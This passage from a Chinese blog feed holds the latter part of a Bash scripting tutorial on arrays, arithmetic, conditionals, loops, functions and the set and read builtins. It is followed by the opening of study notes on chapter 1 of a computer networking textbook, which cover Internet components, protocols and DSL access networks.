<p>更高级的匹配建议使用：<code>grep</code>、<code>awk</code>。</p>
<h2 id="5-数组"><a href="#5-数组" class="headerlink" title="5. 数组"></a>5. 数组</h2><h3 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arr=(value0 value1 value2 value3)</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arr=(</span><br><span class="line">  value0</span><br><span class="line">  value1</span><br><span class="line">  value2</span><br><span class="line">  value3</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>或单独定义（可以不使用连续的下标，而且下标的范围没有限制）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arr[0]=value0</span><br><span class="line">arr[1]=value1</span><br><span class="line">arr[3]=value3</span><br></pre></td></tr></table></figure>

<h3 id="追加"><a href="#追加" class="headerlink" title="追加"></a>追加</h3><p>使用 <code>+=</code> 可追加元素：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arr=(a b c d)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$arr</span>       <span class="comment"># a b c d</span></span><br><span class="line">arr+=(e f)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;arr[@]&#125;</span>  <span class="comment"># a b c d e f</span></span><br></pre></td></tr></table></figure>

<h3 id="使用数组"><a href="#使用数组" class="headerlink" title="使用数组"></a>使用数组</h3><p>单个元素：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">value=<span class="variable">$&#123;arr[i]&#125;</span></span><br></pre></td></tr></table></figure>

<p>全部元素：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;arr[*]&#125;</span></span><br><span class="line"><span class="variable">$&#123;arr[@]&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：</p>
<ul>
<li><strong>默认 <code>$&#123;arr&#125; = $&#123;arr[0]&#125;</code> 而非全部元素。</strong></li>
<li><code>$&#123;arr[@]&#125;</code> <code>&quot;$&#123;arr[@]&#125;&quot;</code> <code>$&#123;arr[*]&#125;</code> <code>&quot;$&#123;arr[*]&#125;&quot;</code> 有不同效果，详情见：<a href="https://wangdoc.com/bash/array.html#%E8%AF%BB%E5%8F%96%E6%89%80%E6%9C%89%E6%88%90%E5%91%98">读取所有成员</a>，<strong>推荐使用 <code>&quot;$&#123;arr[@]&#125;&quot;</code></strong></li>
</ul>
<p>多个元素：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;arr[@]:offset:length&#125;</span></span><br></pre></td></tr></table></figure>

<p>获取数组长度：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;#arr[*]&#125;</span></span><br><span class="line"><span class="variable">$&#123;#arr[@]&#125;</span></span><br></pre></td></tr></table></figure>

<p>获知数组哪个位置上有值，即获取数组中存在值的元素的索引（提取数组索引）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unset</span> arr</span><br><span class="line">arr[1]=a</span><br><span class="line">arr[3]=b</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;!arr[@]&#125;</span> <span class="comment"># 1 3</span></span><br></pre></td></tr></table></figure>

<h2 id="6-运算表达式"><a href="#6-运算表达式" class="headerlink" title="6. 运算表达式"></a>6. 运算表达式</h2><p>语法：使用 <code>(( ))</code> 包裹，或者使用 <code>expr</code> 命令。更推荐前一种。</p>
<p>获取表达式的结果：<code>$(( ))</code> 。</p>
<p>在表达式中可以使用变量，且**不需要加<code>$</code>**。若变量为空，则当作 0 。</p>
<p>在表达式中，可以使用进制：默认十进制、<code>0num</code> 八进制、<code>0xnum</code> 十六进制、<code>base#num</code> base进制</p>
<h3 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h3><ul>
<li><code>+</code> 加法</li>
<li><code>-</code> 减法</li>
<li><code>*</code> 乘法</li>
<li><code>/</code> 除法（整除）</li>
<li><code>%</code> 余数</li>
<li><code>**</code> 指数</li>
<li><code>++</code> 自增运算（前缀或后缀）</li>
<li><code>--</code> 自减运算（前缀或后缀）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">i=0</span><br><span class="line"><span class="built_in">echo</span> $((++i))       <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">echo</span> $(((<span class="number">1</span>+<span class="number">2</span>) * <span class="number">3</span>)) <span class="comment"># 9</span></span><br></pre></td></tr></table></figure>

<h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><p>与 C 语言一致：</p>
<ul>
<li><code>&lt;&lt;</code> 左移</li>
<li><code>&gt;&gt;</code> 右移</li>
<li><code>&amp;</code> 与</li>
<li><code>|</code> 或</li>
<li><code>~</code> 按位取反</li>
<li><code>^</code> 异或</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> $((<span class="number">16</span>&gt;&gt;<span class="number">2</span>)) <span class="comment"># 4</span></span><br></pre></td></tr></table></figure>

<h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><p>与 C 语言一致：</p>
<ul>
<li><code>&lt;</code> 小于</li>
<li><code>&gt;</code> 大于</li>
<li><code>&lt;=</code> 小于或相等</li>
<li><code>&gt;=</code> 大于或相等</li>
<li><code>==</code> 相等</li>
<li><code>!=</code> 不相等</li>
<li><code>&amp;&amp;</code> 逻辑与</li>
<li><code>||</code> 逻辑或</li>
<li><code>!</code> 逻辑否</li>
<li><code>expr1 ? expr2 : expr3</code> 三元条件运算</li>
</ul>
<p>如果逻辑表达式为真，返回1，否则返回0：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> $((<span class="number">3</span> &gt; <span class="number">2</span>)) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure>

<h3 id="赋值运算"><a href="#赋值运算" class="headerlink" title="赋值运算"></a>赋值运算</h3><p>支持直接赋值 <code>=</code> ，也支持 <code>+=</code> <code>*=</code> <code>|=</code> 等等。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">i=1</span><br><span class="line"><span class="built_in">echo</span> $((i+=<span class="number">1</span>)) <span class="comment"># 2</span></span><br></pre></td></tr></table></figure>

<h2 id="7-条件判断-if"><a href="#7-条件判断-if" class="headerlink" title="7. 条件判断 if"></a>7. 条件判断 if</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> commands</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  commands</span><br><span class="line">[<span class="keyword">elif</span> commands</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  commands...]</span><br><span class="line">[<span class="keyword">else</span></span><br><span class="line">  commands]</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> commands; <span class="keyword">then</span></span><br><span class="line">  commands</span><br><span class="line">[<span class="keyword">elif</span> commands; <span class="keyword">then</span></span><br><span class="line">  commands...]</span><br><span class="line">[<span class="keyword">else</span></span><br><span class="line">  commands]</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p><code>if</code> 后面所接的判断条件是一个命令，命令返回成功（0）则为真，返回失败（非0）则为假。</p>
<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p><code>if</code> 判断条件通常使用 <code>test</code> 命令，它是一个用于判断的命令，它有三种形式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 写法一</span></span><br><span class="line"><span class="built_in">test</span> <span class="built_in">expr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写法二</span></span><br><span class="line">[ <span class="built_in">expr</span> ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写法三</span></span><br><span class="line">[[ <span class="built_in">expr</span> ]]</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：</p>
<ul>
<li>中括号 <code>[ ]</code> 与表达式之间必须包含空格</li>
<li>第二种形式与第三种形式，在某些场景（比如逻辑判断）有所不同，详情参考：<a href="https://www.zsythink.net/archives/2252">https://www.zsythink.net/archives/2252</a></li>
</ul>
<p>由于 <code>test</code> 是一个命令，它支持很多选项：</p>
<h4 id="1-文件判断"><a href="#1-文件判断" class="headerlink" title="1) 文件判断"></a>1) 文件判断</h4><ul>
<li><code>[ -a $file ]</code>：如果 file 存在，则为true。</li>
<li><code>[ -b $file ]</code>：如果 file 存在并且是一个块（设备）文件，则为true。</li>
<li><code>[ -c $file ]</code>：如果 file 存在并且是一个字符（设备）文件，则为true。</li>
<li><code>[ -d $file ]</code>：如果 file 存在并且是一个目录，则为true。</li>
<li><code>[ -e $file ]</code>：如果 file 存在，则为true。</li>
<li><code>[ -f $file ]</code>：如果 file 存在并且是一个普通文件，则为true。</li>
</ul>
<p>更多见：<a href="https://wangdoc.com/bash/condition.html#%E6%96%87%E4%BB%B6%E5%88%A4%E6%96%AD">条件判断</a></p>
<h4 id="2-字符串判断"><a href="#2-字符串判断" class="headerlink" title="2) 字符串判断"></a>2) 字符串判断</h4><ul>
<li><code>[ $str ]</code>：如果str不为空（长度大于0），则判断为真。</li>
<li><code>[ -n $str ]</code>：如果字符串str的长度大于零，则判断为真。</li>
<li><code>[ -z $str ]</code>：如果字符串str的长度为零，则判断为真。</li>
<li><code>[ $str1 = $str2 ]</code>：如果str1和str2相同，则判断为真。</li>
<li><code>[ $str1 == $str2 ]</code>：等同于[ $str1 &#x3D; $str2 ]。</li>
<li><code>[ $str1 != $str2 ]</code>：如果str1和str2不相同，则判断为真。</li>
<li><code>[ $str1 &#39;&gt;&#39; $str2 ]</code>：如果按照字典顺序str1排列在str2之后，则判断为真。</li>
<li><code>[ $str1 &#39;&lt;&#39; $str2 ]</code>：如果按照字典顺序str1排列在str2之前，则判断为真。</li>
</ul>
<p><strong>注意</strong>：test命令内部的<code>&gt;</code>和<code>&lt;</code>，必须用引号括起来（或者是用反斜杠转义），否则它们会被 shell 解释为重定向操作符。</p>
<h4 id="3-整数判断"><a href="#3-整数判断" class="headerlink" title="3) 整数判断"></a>3) 整数判断</h4><p>由于 <code>&gt;</code> <code>&lt;</code> 会被误解为重定向操作法，所以有专门的整数判断指令。</p>
<ul>
<li><code>[ $int1 -eq $int2 ]</code>：如果int1等于int2，则为true。</li>
<li><code>[ $int1 -ne $int2 ]</code>：如果int1不等于int2，则为true。</li>
<li><code>[ $int1 -le $int2 ]</code>：如果int1小于或等于int2，则为true。</li>
<li><code>[ $int1 -lt $int2 ]</code>：如果int1小于int2，则为true。</li>
<li><code>[ $int1 -ge $int2 ]</code>：如果int1大于或等于int2，则为true。</li>
<li><code>[ $int1 -gt $int2 ]</code>：如果int1大于int2，则为true。</li>
</ul>
<h4 id="4-逻辑判断"><a href="#4-逻辑判断" class="headerlink" title="4) 逻辑判断"></a>4) 逻辑判断</h4><ul>
<li><code>[[ $expr1 &amp;&amp; $expr1 ]]</code> &#x2F; <code>[ $expr1 ] &amp;&amp; [ $expr1 ]</code></li>
<li><code>[[ $expr1 || $expr1 ]]</code> &#x2F; <code>[ $expr1 ] || [ $expr1 ]</code></li>
<li><code>[ ! $expr1 ]</code> &#x2F; <code>[ ! \( $expr1 &amp;&amp; $expr2 \) ]</code></li>
</ul>
<p><strong>注意</strong>：test命令内部使用<code>(</code>和<code>)</code>必须使用引号或转义。</p>
<h3 id="运算表达式"><a href="#运算表达式" class="headerlink" title="运算表达式"></a>运算表达式</h3><p><code>if</code> 判断条件也可以使用运算表达式 <code>(( ))</code>。</p>
<p>但注意：<strong>运算表达式返回非0 <code>((1))</code> 表示真，返回0 <code>((0))</code> 表示假</strong>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> $((<span class="number">2</span> &gt; <span class="number">1</span>)) <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">if</span> ((2&gt;1)); <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="literal">true</span> <span class="comment"># true</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h3 id="普通命令"><a href="#普通命令" class="headerlink" title="普通命令"></a>普通命令</h3><p><code>if</code> 判断条件可以直接使用命令，命令返回成功（0）则为真，返回失败（非0）则为假。</p>
<p>当然，也可以使用管道、重定向、命令结束符<code>;</code>、命令组合符<code>&amp;&amp;</code> <code>||</code>等。</p>
<p>比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">mkdir</span> temp &amp;&amp; <span class="built_in">cd</span> temp; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;enter in temp/&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h2 id="8-case"><a href="#8-case" class="headerlink" title="8. case"></a>8. case</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> expression <span class="keyword">in</span></span><br><span class="line">  pattern )</span><br><span class="line">    commands ;;</span><br><span class="line">  pattern )</span><br><span class="line">    commands ;;</span><br><span class="line">  ...</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<p><code>pattern</code> 支持基本的模式匹配，比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;输入一个字母或数字 &gt; &quot;</span></span><br><span class="line"><span class="built_in">read</span> character</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$character</span> <span class="keyword">in</span></span><br><span class="line">  [[:lower:]] | [[:upper:]] ) <span class="built_in">echo</span> <span class="string">&quot;输入了字母 <span class="variable">$character</span>&quot;</span></span><br><span class="line">                              ;;</span><br><span class="line">  [0-9] )                     <span class="built_in">echo</span> <span class="string">&quot;输入了数字 <span class="variable">$character</span>&quot;</span></span><br><span class="line">                              ;;</span><br><span class="line">  * )                         <span class="built_in">echo</span> <span class="string">&quot;输入不符合要求&quot;</span></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<h2 id="9-循环"><a href="#9-循环" class="headerlink" title="9. 循环"></a>9. 循环</h2><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> commands; <span class="keyword">do</span></span><br><span class="line">  commands</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>判断条件与 <code>if</code> 一样。</p>
<h3 id="until"><a href="#until" class="headerlink" title="until"></a>until</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">until commands; <span class="keyword">do</span></span><br><span class="line">  commands</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p>遍历列表每一项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> variable <span class="keyword">in</span> <span class="variable">$&#123;arr[@]&#125;</span>; <span class="keyword">do</span></span><br><span class="line">  commands</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>或：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (( expr1; expr2; expr3 )); <span class="keyword">do</span></span><br><span class="line">  commands</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ((i=0; i&lt;10; i++)); <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 0 9); <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h3><p>提前终止本轮循环，进行下一轮循环。</p>
<h2 id="10-函数"><a href="#10-函数" class="headerlink" title="10. 函数"></a>10. 函数</h2><p>定义：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一种</span></span><br><span class="line"><span class="function"><span class="title">func</span></span>() &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二种</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">func</span></span>() &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">func <span class="comment"># 直接调用无参数</span></span><br><span class="line">func param1 param2 <span class="comment"># 传入参数</span></span><br></pre></td></tr></table></figure>

<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p><code>$1~$9</code>：函数的第1个到第9个的参数。<br><code>$0</code>：函数所在的脚本名。<br><code>$#</code>：函数的参数总数。<br><code>$@</code>：函数的全部参数，参数之间使用空格分隔。<br><code>$*</code>：函数的全部参数，参数之间使用变量<code>$IFS</code>值的第一个字符分隔，默认为空格，但是可以自定义。</p>
<h3 id="return"><a href="#return" class="headerlink" title="return"></a>return</h3><p>函数返回，可指定返回值，调用者通过 <code>$?</code> 获取。</p>
<h3 id="local-局部变量"><a href="#local-局部变量" class="headerlink" title="local 局部变量"></a>local 局部变量</h3><p>shell 中定义变量属于全局变量，在函数中声明局部变量需使用 <code>local</code> ，比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">func1</span></span>() &#123;</span><br><span class="line">  foo1=1</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$foo1</span>  <span class="comment"># 1</span></span><br><span class="line">&#125;</span><br><span class="line">func1</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$foo1</span>    <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">func2</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> foo2</span><br><span class="line">  foo2=2</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$foo2</span>  <span class="comment"># 2</span></span><br><span class="line">&#125;</span><br><span class="line">func2</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$foo2</span>    <span class="comment"># 空</span></span><br></pre></td></tr></table></figure>

<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>主要介绍在脚本中使用较多，而在命令行中使用较少的命令。</p>
<h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>命令行下不带任何参数，直接运行 <code>set</code> ，会显示<strong>所有的环境变量和 Shell 函数</strong>。</p>
<p>常用选项：</p>
<ul>
<li><code>set -u</code> 遇到不存在的变量则报错（默认会跳过）</li>
<li><code>set -x</code> 在运行命令前，先输出该命令，常用于调试。<code>set -x</code> 开启，<code>set +x</code> 关闭。</li>
<li><code>set -e</code> 遇到错误则终止执行（默认命令执行出错会忽略）。<code>set -e</code> 有一个例外情况，就是不适用于管道命令（多个子命令通过管道符组合，Bash 会把最后一个子命令的返回值，作为整个命令的返回值）。</li>
<li><code>set -o pipefail</code> 用来解决这种情况，只要一个子命令失败，整个管道命令就失败，脚本就会终止执行。</li>
</ul>
<p>使用示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># set -x # 调试时再开启</span></span><br><span class="line"><span class="built_in">set</span> -euo pipefail</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：</p>
<ul>
<li>使用 <code>set -e</code> 后，如果调用函数，<strong>函数返回了非零值，程序也会退出</strong>！</li>
</ul>
<h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> [-options] [var...]</span><br></pre></td></tr></table></figure>

<p>输入由回车结束，用户输入将被保存到变量 <code>var</code> ，多个输入项通过空格区分。</p>
<p>若未提供变量名，环境变量 <code>REPLY</code> 会包含用户输入的一整行数据。</p>
<p>若提供的输入项少于变量数目，则剩余变量为空。</p>
<p>常用选项：</p>
<ul>
<li><code>p</code> 指定提示信息。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;Enter your input:&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>a</code> 把用户的输入赋值给一个数组，从零号位置开始。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> -a arr</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;arr[@]&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>n</code> 指定只读取若干个字符作为变量值，而不是整行读取。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> -n 3 var</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span></span><br></pre></td></tr></table></figure>

<p>read 还可用于读文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filename=<span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; <span class="variable">$filename</span></span><br></pre></td></tr></table></figure>

<h3 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h3><p>用于退出当前执行的 Shell ，并返回一个值，返回 0 代表成功，返回 非0 代表失败。</p>
<h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>用于执行一个脚本文件，但不同于直接执行（会新建子 shell ），<code>source</code> 会在<strong>当前 shell</strong> 执行。</p>
<p>类似于加载外部库。</p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>程序设计语言</category>
      </categories>
      <tags>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>《计算机网络》笔记-第1章计算机网络和因特网</title>
    <url>/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>鉴于计算机网络的重要性，以及即将开设的计算机网络课程，我决定利用寒假的时间认真研读 <strong>《计算机网络——自顶向下方法》第7版</strong>，并撰写阅读笔记。</p>
<p>愚以为，计算机网络是计算机领域中基础且重要的部分，必须牢固掌握。相对于各种新兴框架，计算机网络才是提高计算机素养的关键之一。值得我们花时间去阅读、研究和实践。</p>
<p>我接触计算机网络，是从一本叫做《网络是如何连接》的小书开始的。这本书十分不错，帮我打开了计算机网络的大门。但这本书中的知识并不深入，也没帮我形成完整的知识体系。所以，此次选择更加权威而全面的《计算机网络——自顶向下方法》进行阅读，希望我能从中收获更多。</p>
<p>这篇是《计算机网络——自顶向下方法》第1章的学习笔记。由于我结合了英文版的内容，所以笔记中用到了一些英文，请大家见谅。不过，个人认为英语对计算机学生还是很重要的（后悔自己英语不好）。同时，笔记中既有原文内容，也有我自己的理解部分。如果存在某些名词跟原文不符，我希望大家不要纠结。（愚以为，重要的在于理解思想，而不在于名词解释、或者概念背诵）</p>
<p>那话不多说，冲冲冲。</p>
<span id="more"></span>

<h2 id="1-What-Is-the-Internet"><a href="#1-What-Is-the-Internet" class="headerlink" title="1. What Is the Internet"></a>1. What Is the Internet</h2><blockquote>
<p>But what is the Internet? There are a couple of ways to answer this question. First, we can describe the nuts and bolts of the Internet, that is, the basic hardware and software components that make up the Internet. Second, we can describe the Internet in terms of a networking infrastructure that provides services to distributed applications.</p>
</blockquote>
<p>什么是因特网？回答这个问题有两种方式：其一，我们能够描述因特网的具体构成，即构成因特网的基本硬件和软件组件；其二，我们能够根据为分布式应用提供服务的联网基础设施来描述因特网。</p>
<h3 id="1-1-A-Nuts-and-Bolts-Description-用具体构成描述因特网"><a href="#1-1-A-Nuts-and-Bolts-Description-用具体构成描述因特网" class="headerlink" title="1.1. A Nuts-and-Bolts Description(用具体构成描述因特网)"></a>1.1. A Nuts-and-Bolts Description(用具体构成描述因特网)</h3><p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91/1.png" alt="1"></p>
<p>客观存在：</p>
<ul>
<li><p><strong>主机(host)</strong> &#x3D;&#x3D; **端系统(end system)**，接入因特网的设备，如图中的电脑、手机、联网汽车等</p>
</li>
<li><p>**通信链路(communication link)**，连接各端系统的物理媒介，图中的线</p>
</li>
<li><p>**分组交换机(packet switch)**，通信链路中的交叉口。其中最著名的两种是：</p>
<ul>
<li>**路由器(router)**，图中的圆形带“X”体</li>
<li>**链路层交换机(link-layer switch)**，图中的方形带“X”体</li>
</ul>
</li>
<li><p>**分组(packet)**，由一台端系统发送给另一台端系统的数据&#x2F;信息包</p>
</li>
</ul>
<p>主观存在：</p>
<ul>
<li><p>**ISP(Internet Service Provider, 因特网服务提供商)**，为端系统提供接入因特网的服务。较低层的ISP管理某个区域，类似于校园网、公司网等；较高层的ISP管理整个国家，类似于联通、移动等。</p>
</li>
<li><p>**协议(protocol)**，因特网中最重要的两个协议是：</p>
<ul>
<li><strong>TCP(Transmission Control Protocol, 传输控制协议)</strong></li>
<li><strong>IP(Internet Protocol, 网际协议)</strong></li>
</ul>
</li>
</ul>
<p>将因特网与现代物流系统类比：</p>
<table>
<thead>
<tr>
<th>因特网</th>
<th>物流</th>
</tr>
</thead>
<tbody><tr>
<td>端系统</td>
<td>货物寄送或到达的地方</td>
</tr>
<tr>
<td>通信链路</td>
<td>高速公路、铁路、普通公路等</td>
</tr>
<tr>
<td>分组交换机</td>
<td>岔路口</td>
</tr>
<tr>
<td>分组</td>
<td>货物</td>
</tr>
<tr>
<td>ISP</td>
<td>公路局、铁路局等</td>
</tr>
</tbody></table>
<h3 id="1-2-A-Services-Description-用服务描述因特网"><a href="#1-2-A-Services-Description-用服务描述因特网" class="headerlink" title="1.2. A Services Description(用服务描述因特网)"></a>1.2. A Services Description(用服务描述因特网)</h3><ul>
<li>**分布式应用程序(distributed application)**，各大网站</li>
</ul>
<h3 id="1-3-What-Is-a-Protocol"><a href="#1-3-What-Is-a-Protocol" class="headerlink" title="1.3. What Is a Protocol"></a>1.3. What Is a Protocol</h3><p>人们规定好的一套交流、行事的标准，就是协议</p>
<p>古代儒学、书信格式、普通话标准等等，都是协议。</p>
<p>学习计算机网络，最重要的就在于理解网络协议。</p>
<h2 id="2-The-Network-Edge-网络边缘"><a href="#2-The-Network-Edge-网络边缘" class="headerlink" title="2. The Network Edge(网络边缘)"></a>2. The Network Edge(网络边缘)</h2><p>网络边缘主要包括：端系统和接入网</p>
<h3 id="2-1-Access-Networks-接入网"><a href="#2-1-Access-Networks-接入网" class="headerlink" title="2.1. Access Networks(接入网)"></a>2.1. Access Networks(接入网)</h3><ul>
<li><p>接入网(access networks)，将端系统物理连接到其边缘路由器的网络</p>
</li>
<li><p>边缘路由器(edge router)，端系统发送的数据，到达任何其它远程端系统所经过的第一台路由器</p>
</li>
</ul>
<p>以上定义有待考察。</p>
<p>总而言之，<strong>接入网</strong>就是指连接互联网与家庭、公司网络的通信线路。其长度一般为几百米到几公里，因而被形象地称为”最后一公里”。它包括 DSL、电缆、FTTH 等</p>
<h4 id="2-1-1-DSL-Digital-Subscriber-Line-数字用户线"><a href="#2-1-1-DSL-Digital-Subscriber-Line-数字用户线" class="headerlink" title="2.1.1. DSL(Digital Subscriber Line, 数字用户线)"></a>2.1.1. DSL(Digital Subscriber Line, 数字用户线)</h4><p>DSL，即<strong>用电话线作为网线</strong>。它包括**ADSL(Asymmetric Digital Subscriber Line，非对称数字用户线)**、RADSL、HDSL和VDSL等等</p>
<p>用户从提供本地电话接入的本地电话公司处，获取DSL因特网接入，用户的本地电话公司即是它的ISP。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91/2.png" alt="1"></p>
<p>如上图所示，每个用户的 <strong>DSL调制解调器(DSL modem)</strong> 使用现有电话线(双绞铜线)，与位于电话公司的本地中心局中的 <strong>数字用户线接入复用器(DSLAM)</strong> 交换数据，<strong>分配器(splitter)</strong> 则将网络信号与电话信号分开。</p>
<p>在电话线中，包含三个通道：</p>
<ul>
<li>电话信号通道位于0到4kHz频段；</li>
